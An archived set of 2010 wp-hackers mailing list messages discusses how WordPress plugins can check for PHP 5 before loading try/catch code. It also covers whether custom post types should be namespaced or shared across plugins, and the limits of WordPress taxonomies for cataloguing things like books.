From eric at eamann.com  Mon Jul 12 17:09:36 2010
From: eric at eamann.com (Eric Mann)
Date: Mon, 12 Jul 2010 10:09:36 -0700 (PDT)
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E303B@tbs-sbs01.TBS.local>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com><F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
	<715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de>
	<CD47955B7E065D48AB5CF226C2ED75C02E303B@tbs-sbs01.TBS.local>
Message-ID: <1367331722.228600.1278954576520.JavaMail.open-xchange@oxusltgw12.schlund.de>

I've been using a custom XMLRPC reporter on my new plug-ins to report back when
the scripts throw errors (to make up for the "It's broke" messages I get without
any details regarding what broke or what they were trying to do).
?Unfortunately, my system only works with PHP5, so I don't know how many people
are using PHP4 ...
?
... but it's frighteningly common for people to try to install my plug-ins on
WordPress 2.7 or lower when they explicitly require 2.9 or higher (I've had
people try to install them on version 2.0!!! ?Then they email me a few days
later and try to claim the plug-in is broken because it won't work on their
system!).
?
So no, a stern warning on the plugin download page isn't enough. ?I wonder if
anyone (lay users) actually reads the full download page before installing or if
they just read the name and say "oh, that sounds good."

On July 12, 2010 at 5:02 PM Kris Young <KrisY at tbs.uk.com> wrote:

> Would have thought that a stern warning on the plugin download page would do
> enough. Especially in coding policy on WordPress 3, PHP4 is being slowly
> squeezed out.
>
> Do you anticipate a lot of PHP4 users, or is it a 'better-safe-than-sorry'
> measure?
>
> Kris
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
> Sent: 12 July 2010 15:31
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Testing for PHP 5 before activating
>
> John,
> ?
> We'd need to see how your try/catch structure is formed to help you fix that
> ...?
>
> On July 12, 2010 at 2:26 PM John Eckman <eckman.john at gmail.com> wrote:
>
> > Otto - recently in wp-hackers you reposted this code, which I've seen posted
> > before.
> >
> > I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm still
> > having an issue.
> >
> > Because my plugin uses try/catch syntax, the minute it gets uploaded, before
> > the user can even activate it, they get a syntax error about an unexpected
> > open curly brace {.
> >
> > Any suggestions on how to work around that?
> >
> >
> > On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:
> >
> > > /**
> > > * plugin_activation_check()
> > > *
> > > * Replace "plugin" with the name of your plugin
> > > */
> > > function plugin_activation_check(){
> > >? ? ? ? ?if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> > >? ? ? ? ? ? ? ? ?deactivate_plugins(basename(__FILE__)); // Deactivate
> > >ourself
> > >? ? ? ? ? ? ? ? ?wp_die("Sorry, but you can't run this plugin, it requires
> > >PHP 5 or higher.");
> > >? ? ? ? ?}
> > > }
> > > register_activation_hook(__FILE__, 'plugin_activation_check');
> > >
> > >
> > > -Otto
> >
> >
> > ----------------------------------------
> > John Eckman
> > eckman.john at gmail.com
> > http://www.johneckman.com/
> >
> >
> >
> >
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From hempsworth at gmail.com  Mon Jul 12 17:11:14 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Mon, 12 Jul 2010 18:11:14 +0100
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <1367331722.228600.1278954576520.JavaMail.open-xchange@oxusltgw12.schlund.de>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com> 
	<F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
	<715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de>
	<CD47955B7E065D48AB5CF226C2ED75C02E303B@tbs-sbs01.TBS.local> 
	<1367331722.228600.1278954576520.JavaMail.open-xchange@oxusltgw12.schlund.de>
Message-ID: <AANLkTinErPavGWDs8CuU7pQVdfCYcYKa4ixCbxxtdSKu@mail.gmail.com>

Is the code for your error reporter available for others to use in their
plugins?

-- Alex  (Hempsworth)


On Mon, Jul 12, 2010 at 6:09 PM, Eric Mann <eric at eamann.com> wrote:

> I've been using a custom XMLRPC reporter on my new plug-ins to report back
> when
> the scripts throw errors (to make up for the "It's broke" messages I get
> without
> any details regarding what broke or what they were trying to do).
>  Unfortunately, my system only works with PHP5, so I don't know how many
> people
> are using PHP4 ...
>
> ... but it's frighteningly common for people to try to install my plug-ins
> on
> WordPress 2.7 or lower when they explicitly require 2.9 or higher (I've had
> people try to install them on version 2.0!!!  Then they email me a few days
> later and try to claim the plug-in is broken because it won't work on their
> system!).
>
> So no, a stern warning on the plugin download page isn't enough.  I wonder
> if
> anyone (lay users) actually reads the full download page before installing
> or if
> they just read the name and say "oh, that sounds good."
>
> On July 12, 2010 at 5:02 PM Kris Young <KrisY at tbs.uk.com> wrote:
>
> > Would have thought that a stern warning on the plugin download page would
> do
> > enough. Especially in coding policy on WordPress 3, PHP4 is being slowly
> > squeezed out.
> >
> > Do you anticipate a lot of PHP4 users, or is it a
> 'better-safe-than-sorry'
> > measure?
> >
> > Kris
> >
> > -----Original Message-----
> > From: wp-hackers-bounces at lists.automattic.com
> > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
> > Sent: 12 July 2010 15:31
> > To: wp-hackers at lists.automattic.com
> > Subject: Re: [wp-hackers] Testing for PHP 5 before activating
> >
> > John,
> >
> > We'd need to see how your try/catch structure is formed to help you fix
> that
> > ...
> >
> > On July 12, 2010 at 2:26 PM John Eckman <eckman.john at gmail.com> wrote:
> >
> > > Otto - recently in wp-hackers you reposted this code, which I've seen
> posted
> > > before.
> > >
> > > I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm
> still
> > > having an issue.
> > >
> > > Because my plugin uses try/catch syntax, the minute it gets uploaded,
> before
> > > the user can even activate it, they get a syntax error about an
> unexpected
> > > open curly brace {.
> > >
> > > Any suggestions on how to work around that?
> > >
> > >
> > > On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:
> > >
> > > > /**
> > > > * plugin_activation_check()
> > > > *
> > > > * Replace "plugin" with the name of your plugin
> > > > */
> > > > function plugin_activation_check(){
> > > >         if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> > > >                 deactivate_plugins(basename(__FILE__)); // Deactivate
> > > >ourself
> > > >                 wp_die("Sorry, but you can't run this plugin, it
> requires
> > > >PHP 5 or higher.");
> > > >         }
> > > > }
> > > > register_activation_hook(__FILE__, 'plugin_activation_check');
> > > >
> > > >
> > > > -Otto
> > >
> > >
> > > ----------------------------------------
> > > John Eckman
> > > eckman.john at gmail.com
> > > http://www.johneckman.com/
> > >
> > >
> > >
> > >
> > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Mon Jul 12 17:21:24 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 12 Jul 2010 12:21:24 -0500
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <AANLkTinzs8A47iG4koSfbOzVj--5vTMHLw1plqLQG3wQ@mail.gmail.com>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com> 
	<F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
	<AANLkTinzs8A47iG4koSfbOzVj--5vTMHLw1plqLQG3wQ@mail.gmail.com>
Message-ID: <AANLkTikDZabaGR1OGAA0QmTyJ9e0NOmgdiWMWEuYGvSM@mail.gmail.com>

On Mon, Jul 12, 2010 at 9:29 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
> Keep the rest of your plugin in a second file and only include it when you
> know you can support it.

This.

I had to eventually do the same thing with Simple Facebook Connect,
because people simply don't read requirements.

The problem is that try/catch is invalid syntax in PHP 4 and will
cause an error on activation, and the activation handler can't prevent
it. The only way to do it is to include a check and load a separate
file.

Basically, I did this:

// this will prevent the PHP 5 code from causing parsing errors on PHP 4 systems
if (!version_compare(PHP_VERSION, '5', '<')) {
	include 'sfc-base.php';
}

Then moved all the rest of the code (minus the activation check) into
sfc-base.php.

-Otto

From eric at eamann.com  Mon Jul 12 17:27:45 2010
From: eric at eamann.com (Eric Mann)
Date: Mon, 12 Jul 2010 10:27:45 -0700 (PDT)
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <AANLkTinErPavGWDs8CuU7pQVdfCYcYKa4ixCbxxtdSKu@mail.gmail.com>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com>
	<F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
	<715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de>
	<CD47955B7E065D48AB5CF226C2ED75C02E303B@tbs-sbs01.TBS.local>
	<1367331722.228600.1278954576520.JavaMail.open-xchange@oxusltgw12.schlund.de>
	<AANLkTinErPavGWDs8CuU7pQVdfCYcYKa4ixCbxxtdSKu@mail.gmail.com>
Message-ID: <91832654.229066.1278955665995.JavaMail.open-xchange@oxusltgw12.schlund.de>

It's still a very rough framework right now. ?The only available method is a
generic "send message" one. ?You can look through the client side of things on
my Facebook Dashboard widget plugin
(http://wordpress.org/extend/plugins/facebook-dashboard/). ?
?
The server side of things is a bit more sophisticated ... but it's not publicly
available (yet). ?Basically, it extends the Wordpress XMLRPC API to allow remote
sites to post information to a database table that holds the site address, the
admin contact email, the current versions of PHP and WordPress on their system,
and whether or not fopen() is enabled (I have plug-ins that depend on this
function ... so if I see fopen() is disabled, that's my first recommendation for
fixing errors).
?
In any case, the client-side script for the reporter is in
/facebook-dashboard/includes/elliot.php.
?
The server-side script is (temporarily) available in a
pastebin:?http://wordpress.pastebin.com/yKuQpsw4
?
I've included all of the server files, and marked them with -- filename.php --
so you can cut them back apart. ?Like I said, it's not well-documented but
that's because it's not entirely finished, either.
?
So if you have any requests for feature improvement, feel free to drop me a line
and I'll see what I can do :-)
?
?
On July 12, 2010 at 5:11 PM Alex Hempton-Smith <hempsworth at gmail.com> wrote:

> Is the code for your error reporter available for others to use in their
> plugins?
>
> -- Alex? (Hempsworth)
>
>
> On Mon, Jul 12, 2010 at 6:09 PM, Eric Mann <eric at eamann.com> wrote:
>
> > I've been using a custom XMLRPC reporter on my new plug-ins to report back
> > when
> > the scripts throw errors (to make up for the "It's broke" messages I get
> > without
> > any details regarding what broke or what they were trying to do).
> >? Unfortunately, my system only works with PHP5, so I don't know how many
> > people
> > are using PHP4 ...
> >
> > ... but it's frighteningly common for people to try to install my plug-ins
> > on
> > WordPress 2.7 or lower when they explicitly require 2.9 or higher (I've had
> > people try to install them on version 2.0!!!? Then they email me a few days
> > later and try to claim the plug-in is broken because it won't work on their
> > system!).
> >
> > So no, a stern warning on the plugin download page isn't enough.? I wonder
> > if
> > anyone (lay users) actually reads the full download page before installing
> > or if
> > they just read the name and say "oh, that sounds good."
> >
> > On July 12, 2010 at 5:02 PM Kris Young <KrisY at tbs.uk.com> wrote:
> >
> > > Would have thought that a stern warning on the plugin download page would
> > do
> > > enough. Especially in coding policy on WordPress 3, PHP4 is being slowly
> > > squeezed out.
> > >
> > > Do you anticipate a lot of PHP4 users, or is it a
> > 'better-safe-than-sorry'
> > > measure?
> > >
> > > Kris
> > >
> > > -----Original Message-----
> > > From: wp-hackers-bounces at lists.automattic.com
> > > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
> > > Sent: 12 July 2010 15:31
> > > To: wp-hackers at lists.automattic.com
> > > Subject: Re: [wp-hackers] Testing for PHP 5 before activating
> > >
> > > John,
> > >
> > > We'd need to see how your try/catch structure is formed to help you fix
> > that
> > > ...
> > >
> > > On July 12, 2010 at 2:26 PM John Eckman <eckman.john at gmail.com> wrote:
> > >
> > > > Otto - recently in wp-hackers you reposted this code, which I've seen
> > posted
> > > > before.
> > > >
> > > > I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm
> > still
> > > > having an issue.
> > > >
> > > > Because my plugin uses try/catch syntax, the minute it gets uploaded,
> > before
> > > > the user can even activate it, they get a syntax error about an
> > unexpected
> > > > open curly brace {.
> > > >
> > > > Any suggestions on how to work around that?
> > > >
> > > >
> > > > On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:
> > > >
> > > > > /**
> > > > > * plugin_activation_check()
> > > > > *
> > > > > * Replace "plugin" with the name of your plugin
> > > > > */
> > > > > function plugin_activation_check(){
> > > > >? ? ? ? ?if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> > > > >? ? ? ? ? ? ? ? ?deactivate_plugins(basename(__FILE__)); // Deactivate
> > > > >ourself
> > > > >? ? ? ? ? ? ? ? ?wp_die("Sorry, but you can't run this plugin, it
> > requires
> > > > >PHP 5 or higher.");
> > > > >? ? ? ? ?}
> > > > > }
> > > > > register_activation_hook(__FILE__, 'plugin_activation_check');
> > > > >
> > > > >
> > > > > -Otto
> > > >
> > > >
> > > > ----------------------------------------
> > > > John Eckman
> > > > eckman.john at gmail.com
> > > > http://www.johneckman.com/
> > > >
> > > >
> > > >
> > > >
> > > >
> > > > _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From KrisY at tbs.uk.com  Mon Jul 12 17:31:23 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Mon, 12 Jul 2010 18:31:23 +0100
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <1367331722.228600.1278954576520.JavaMail.open-xchange@oxusltgw12.schlund.de>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com><F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com><715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de><CD47955B7E065D48AB5CF226C2ED75C02E303B@tbs-sbs01.TBS.local>
	<1367331722.228600.1278954576520.JavaMail.open-xchange@oxusltgw12.schlund.de>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E303D@tbs-sbs01.TBS.local>

Okay, that's a fair point. Admitting that I used to be one of those WP-newbies that would install incompatible plugins, and it does way more harm than good.

Good luck with your project!

Kris 

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
Sent: 12 July 2010 18:10
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Testing for PHP 5 before activating

I've been using a custom XMLRPC reporter on my new plug-ins to report back when
the scripts throw errors (to make up for the "It's broke" messages I get without
any details regarding what broke or what they were trying to do).
?Unfortunately, my system only works with PHP5, so I don't know how many people
are using PHP4 ...
?
... but it's frighteningly common for people to try to install my plug-ins on
WordPress 2.7 or lower when they explicitly require 2.9 or higher (I've had
people try to install them on version 2.0!!! ?Then they email me a few days
later and try to claim the plug-in is broken because it won't work on their
system!).
?
So no, a stern warning on the plugin download page isn't enough. ?I wonder if
anyone (lay users) actually reads the full download page before installing or if
they just read the name and say "oh, that sounds good."

On July 12, 2010 at 5:02 PM Kris Young <KrisY at tbs.uk.com> wrote:

> Would have thought that a stern warning on the plugin download page would do
> enough. Especially in coding policy on WordPress 3, PHP4 is being slowly
> squeezed out.
>
> Do you anticipate a lot of PHP4 users, or is it a 'better-safe-than-sorry'
> measure?
>
> Kris
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
> Sent: 12 July 2010 15:31
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Testing for PHP 5 before activating
>
> John,
> ?
> We'd need to see how your try/catch structure is formed to help you fix that
> ...?
>
> On July 12, 2010 at 2:26 PM John Eckman <eckman.john at gmail.com> wrote:
>
> > Otto - recently in wp-hackers you reposted this code, which I've seen posted
> > before.
> >
> > I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm still
> > having an issue.
> >
> > Because my plugin uses try/catch syntax, the minute it gets uploaded, before
> > the user can even activate it, they get a syntax error about an unexpected
> > open curly brace {.
> >
> > Any suggestions on how to work around that?
> >
> >
> > On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:
> >
> > > /**
> > > * plugin_activation_check()
> > > *
> > > * Replace "plugin" with the name of your plugin
> > > */
> > > function plugin_activation_check(){
> > >? ? ? ? ?if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> > >? ? ? ? ? ? ? ? ?deactivate_plugins(basename(__FILE__)); // Deactivate
> > >ourself
> > >? ? ? ? ? ? ? ? ?wp_die("Sorry, but you can't run this plugin, it requires
> > >PHP 5 or higher.");
> > >? ? ? ? ?}
> > > }
> > > register_activation_hook(__FILE__, 'plugin_activation_check');
> > >
> > >
> > > -Otto
> >
> >
> > ----------------------------------------
> > John Eckman
> > eckman.john at gmail.com
> > http://www.johneckman.com/
> >
> >
> >
> >
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Mon Jul 12 19:10:15 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 15:10:15 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3B0CF7.2000309@voceconnect.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
Message-ID: <AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>

On Jul 12, 2010, at 8:39 AM, Michael Pretty wrote:
> I first want to say that I somewhat disagree with the idea of namespacing post types.  Ideally, content shouldn't be tied to the plugin that manages it.  If my site uses events that are either created by a plugin or a theme and I want to switch to a new plugin that manages that content, I should be able to without having to recreate all of those events.  There was a wp-hackers thread a little bit ago about standardizing geo-data so it could be shared amongst plugins.  I think the fields that shape into something like an event or product should also be somewhat standardized.

Great comments Michael.  My thoughts that started this thread are actually more compatible with your thoughts than less. I agree that post types shared across plugins would be an ideal outcome, more so then having every post type namespaced.

I think there is room for both but the current situation has us in a bit of "no man's land."  On the shared post types it's not really realistic to expect what you envision unless there is some collaboration amongst (some of) the people who create and use those post types. Without collaboration we'll arbitrarily get "Event" plugins that name the custom fields that denotes where the event takes place as "venue", "location", "event_loc", "facility", etc.  Clearly you see how that won't enable shared use, right?

To enable this collaboration doesn't have to be complicated, it could be as simple adding a section to the CPT codex page with links to the shared post types to discuss and a suggestion that to discuss a new that the person doing it create a google mailing list for discussion and a new coded page for each.  

***
Actually, if there are no significant objections to me doing that I'll go ahead and update the codex to that effect and see where it evolves.
***

Included with this codex could be evolving best practices on how to build plugins and themes with CPTs that won't conflict but that will share and the evolving list of "recommended" custom fields to add and anything else that needs to be recommended.  

***
As I'm writing this I realize I'm potentially coining a term, i.e. "Shared Post Types."  Is this term acceptable and if not, is there a better one?
***

On the namespaced side, there are going to be people who create custom post types who don't want to collaborate about it at all. They just want to add to their theme or their clients custom post type and move on. They are often heads down on a project and are not contributing to the community. But these people are leveraging WordPress and many things they do stupidly will reflect negatively on the client's perception of WordPress.  Better to recommend these people namespace their post types than have their code cause conflict with plugins down the road, right?

> As for future compatibility with core post types, I really hope that core doesn't ever add any more post types.  If anything, I'd prefer if posts and pages were no longer built in.  With custom post types and taxonomies, we have really opened up the types of web-apps for which WordPress can be the backbone.  Then posts and pages could be a core plugin automatically included in upgrades and installs.

That's a really interesting perspective, and one I really like.  I guess it depends on what the core team decides; doesn't look good based on what Andrew said but it remains to be seen.

> On Mon, Jul 12, 2010 at 8:39 AM, Michael Pretty <mpretty at voceconnect.com>wrote:
> 
>> If anything, I'd prefer if posts and pages were no longer built in. ... Then
>> posts and pages could be a core plugin automatically included in upgrades
>> and installs.
> 
> They'll always be built in, but I'd like to see them become like any other
> post type (which includes the ability for another plugin to unregister them
> without the sky falling), and I imagine we'll be heading further in that
> direction in future releases. Same goes for tags and categories.

It would really be nice to be able to avoid initializing unwanted post types (or most anything else for that matter.)  It really feels like bloat to me to have WordPress initialize something and then require me to remove it. Sure would be nice if in a config file we could remove the code that tells WordPress that we want something instead of having to remove them after they are added.

> Just to clarify the last part, without turning this into a discussion on
> that. The core plugin experiment is still evolving, but one thing that has
> never been considered is that any of them will be bundled.

"Not bundled?"  Can you clarify please?  I hope this doesn't mean what I think it means?  Without bundling you get very few of the benefits that (some of us) have envisioned we'd finally get from core plugins.

Of course if it's an issue of download size then "virtual bundling" addresses the same needs.  For example, having a section for core plugins which lists all of the core plugins with a brief description that allows the user to install each of them easily. This would be separate from the plugin repository search which really requires someone to find and then decided which plugin to choose to meet their needs.

If you need a new thread to discuss this issue, please do...  

-Mike
  

From otto at ottodestruct.com  Mon Jul 12 19:30:33 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 12 Jul 2010 14:30:33 -0500
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net> 
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com> 
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk> 
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
Message-ID: <AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>

On Mon, Jul 12, 2010 at 2:10 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> "Not bundled?" ?Can you clarify please? ?I hope this doesn't mean what I think it means?

Pretty sure that means exactly what it sounds like. The notion was
never to include these plugins in the main WP download, but to provide
a special place for them in the repository/view where they'd be a bit
more prominent.

> Of course if it's an issue of download size then "virtual bundling" addresses the same needs. ?For example, having a section for core plugins which lists all of the core plugins with a brief description that allows the user to install each of them easily. This would be separate from the plugin repository search which really requires someone to find and then decided which plugin to choose to meet their needs.

Yeah. That. Or something similar.

-Otto

From peter.westwood at ftwr.co.uk  Mon Jul 12 20:24:13 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 12 Jul 2010 21:24:13 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
Message-ID: <29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>

I've read through the whole thread and he are my comments.

Personally I would recommend against people "reserving" post types - you are creating mines in which your data will be stored which won't make it easy for other plugins or themes to interact with without breaking arbitrary rules:

"like custom post types must be prefixed in a plugin specific way"

I would rather recommend that if you are creating a plugin which allows people to create "Events" you use a post type called "event" and you write your code in such a way that if some special piece of post_meta you need is missing you have a default for it which you use.

That way when I decide to switch from your Events plugin to this new kid on the block I can still manage and use all those events I already created using the new plugin.

Basically a plugin using Custom Post Types should follow Postel's Law: 

"be conservative in what you do, be liberal in what you accept from others"

I think that it is better for the community and the users in general if it is easy for people to switch between plugins which compete in the same space rather than difficult because they have stored the data slightly differently after all this is why we have custom post types instead of each plugin creating it's own tables.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From wordpress at web-warlocks.net  Mon Jul 12 20:28:07 2010
From: wordpress at web-warlocks.net (The WordPress Web Warlock)
Date: Mon, 12 Jul 2010 22:28:07 +0200
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3B0CF7.2000309@voceconnect.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>	<4C3ACEFD.5020208@elfden.co.uk>
	<4C3B0CF7.2000309@voceconnect.com>
Message-ID: <4C3B7AD7.2010206@web-warlocks.net>

En/na Michael Pretty ha escrit:
> Sorry if some of this has already been said. I've been out for a few 
> days and am playing catch-up. I first want to say that I somewhat 
> disagree with the idea of namespacing post types. Ideally, content 
> shouldn't be tied to the plugin that manages it. If my site uses 
> events that are either created by a plugin or a theme and I want to 
> switch to a new plugin that manages that content, I should be able to 
> without having to recreate all of those events. There was a wp-hackers 
> thread a little bit ago about standardizing geo-data so it could be 
> shared amongst plugins. I think the fields that shape into something 
> like an event or product should also be somewhat standardized.
If I don't remember it wrong, it wasn't exactly about "sharing amongst 
plugins", but also "using API of external apps", too. It makes a lot of 
sense IMHO for geodata, calendars, & other things that have some "de 
facto" standards ? like microformats.
But I don't see it as clear with other type of content ?say, books. It'd 
be hard enough to get a common definition of what a book is, indeed... 
(You'll see why I'm saying this.)

And even then, some standards can have many different implementations, 
so it's hard to stick just to one. How do we do ratings? Unless you 
store score AND scale, the "five-star-scale" and the "0 to 10 scale" can 
be pretty incompatible. (If you add score and scale, though, you can 
even compare ratings in different scales; just store the rating in a 
common scale, say 0 to 1, and convert it for display).

So, I'd leave it as "if there's a standard of any kind, use it, dangit!"
> (...) With custom post types and taxonomies, we have really opened up 
> the types of web-apps for which WordPress can be the backbone.
I disagree with that, but not entirely. There are lots of things that 
have been mentioned as "now we can" with post types that, from my 
experience, are best done with regular categories and posts. Books are 
quite an example, as real estate and movies, at least until some major 
enhancements are done to taxonomies/WP_Query.

I'll put you an example with books. Suppose we're to add ShakeSpeare's 
Sonnets: we'd have the "book" post type, the "genre" taxonomy, some 
"publisher" and maybe "collection" taxonomies.

AFAIK, it's a real mess to query althogether for genre=poetry AND 
author=william-shakespeare AND post_type=book. Last time I worked on it, 
the query var for taxonomies was just a rewrite for taxonomy and term. 
And adding another taxonomy query (say, "publisher" or "collection") 
meant adding another instance of the taxonomies table. So I went for 
another, more scalable and API-using approach instead.

Also, taxonomies are not hierarchical (and by this I mean "taxonomies 
cannot be children/parent of other taxonomies", I'm not talking about 
taxonomy *terms*). Categories (or terms for a hierarchical taxonomy) 
are. You can list both your books, magazines, comic books, fanzines and 
AD&D boxes all together, or separately, as you need to. Hey, I worked 
for a roleplaying publisher that issued a box with the books, a T-shirt 
and a character miniature... And a post can belong to *many* 
"content_type" categories, but can be of only one post_type. So, 
SuperSoaps INC. could be listed as being a book, and a bundle, and a 
T-shirt, and having goodies, and miniature. (Well, the game was actually 
called "SuperHeroes INC.", but it got the soap nickname... guess why :) 
